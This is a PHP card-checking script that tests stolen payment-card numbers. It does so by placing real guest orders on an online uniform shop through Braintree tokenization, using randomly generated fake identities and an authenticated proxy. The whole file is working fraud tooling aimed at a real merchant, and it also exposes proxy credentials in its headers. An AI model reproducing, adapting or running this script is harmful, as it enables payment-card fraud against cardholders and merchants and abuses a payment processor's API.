<?php

error_reporting(0);

$Cookie = "".time().".txt";


function B3SESS(){
if (function_exists('com_create_guid') === true)
return trim(com_create_guid(), '{}');
$data = openssl_random_pseudo_bytes(16);
$data[6] = chr(ord($data[6]) & 0x0f | 0x40);
$data[8] = chr(ord($data[8]) & 0x3f | 0x80);
return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

function cap($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}


# LISTA  

$num = "".mt_rand()."".time()."_cookie.txt";

$lista = explode('|', $_GET['lista']);
$cc = $lista[0];
$mm = $lista[1];
$yy = $lista[2];
$cv = $lista[3];


# Random Info:

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$dec = json_decode($get, TRUE);
$name    = $dec["results"][0]["name"]["first"];
$last    = $dec["results"][0]["name"]["last"];
$street  = $dec["results"][0]["location"]["street"];
$state   = $dec["results"][0]["location"]["state"];
$city    = $dec["results"][0]["location"]["city"];
$zip     = $dec["results"][0]["location"]["postcode"];
$email   = $dec["results"][0]["email"];
$email   = str_replace("example.com", "gmail.com", "$email");
$phone   = "315".rand(011,999)."".rand(0110,9999)."";


# CURL -1:

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://idealuniform.com/checkout/cart/add/uenc/aHR0cHM6Ly9pZGVhbHVuaWZvcm0uY29tL3RyaW1maXQtYm95cy1jb3R0b24tc3BhbmRleC1zb2Nrcy0xMTIwNS5odG1s/product/27990/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: idealuniform.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Content-Type: multipart/form-data; boundary=---------------------------73594703436630487951746169160';
$headers[] = 'Origin: https://idealuniform.com';
$headers[] = 'Proxy-Authorization: Basic NmNyYmdlOTIteTR4cDh2aDpzaGU5anJrbXo1';
$headers[] = 'Referer: https://idealuniform.com/trimfit-boys-cotton-spandex-socks-11205.html';
$headers[] = 'Cookie: form_key=dVlFAUBbXmjSqu0f; mage-cache-sessid=true';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="product"

27990
-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="selected_configurable_option"


-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="related_product"


-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="item"

27990
-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="form_key"

dVlFAUBbXmjSqu0f
-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="super_attribute[301]"

1829
-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="super_attribute[93]"

64
-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="super_attribute[146]"

29
-----------------------------73594703436630487951746169160
Content-Disposition: form-data; name="qty"

1
-----------------------------73594703436630487951746169160--
');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$num);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$num);
 $curl1 = curl_exec($ch);

# CURL -2:


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://idealuniform.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: idealuniform.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Proxy-Authorization: Basic NmNyYmdlOTIteTR4cDh2aDpzaGU5anJrbXo1';
$headers[] = 'Referer: https://idealuniform.com/trimfit-boys-cotton-spandex-socks-11205.html';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$num);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$num);
$curl2 = curl_exec($ch);
$cartid  = cap($curl2,'"entity_id":"','"');
$JWT     = cap(base64_decode(cap($curl2,'"clientToken":"','"')),'"authorizationFingerprint":"','"');

# CURL -3:

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://idealuniform.com/rest/default/V1/guest-carts/'.$cartid.'/shipping-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: idealuniform.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/json';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://idealuniform.com';
$headers[] = 'Proxy-Authorization: Basic NmNyYmdlOTIteTR4cDh2aDpzaGU5anJrbXo1';
$headers[] = 'Referer: https://idealuniform.com/checkout/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["'.$street.'"],"company":"","telephone":"'.$phone.'","postcode":"10080","city":"NY","firstname":"adwad","lastname":"awdadwa"},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["'.$street.'"],"company":"","telephone":"'.$phone.'","postcode":"10080","city":"NY","firstname":"adwad","lastname":"awdadwa","saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{}}}');
$curl3   = curl_exec($ch);
$amount  = cap($curl3,'"grand_total":',',"');

# CURL -3:

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$JWT;
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Proxy-Authorization: Basic NmNyYmdlOTIteTR4cDh2aDpzaGU5anJrbXo1';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.B3SESS().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl4 = curl_exec($ch);
$token = cap($curl4,'"token":"','"');


# CURL -4:

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://idealuniform.com/rest/default/V1/guest-carts/'.$cartid.'/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: idealuniform.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/json';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://idealuniform.com';
$headers[] = 'Proxy-Authorization: Basic NmNyYmdlOTIteTR4cDh2aDpzaGU5anJrbXo1';
$headers[] = 'Referer: https://idealuniform.com/checkout/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$cartid.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["'.$street.'"],"company":"","telephone":"'.$phone.'","postcode":"10080","city":"NY","firstname":"adwad","lastname":"awdadwa","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$token.'","device_data":"{\"correlation_id\":\"'.substr(sha1(time()),0,32).'\"}"}},"email":"'.$email.'"}');
$curl5 = curl_exec($ch);
$getrr = curl_getinfo($ch);
$http = $getrr["http_code"];
$ERROR = cap($curl5,'"message":"Your payment could not be taken. Please try again or use a different payment method.','"');

if ($http == "200" and !empty($curl5)) {
  echo "Successful [$amount]";
}
else {
	echo "Failed [$ERROR]";
}
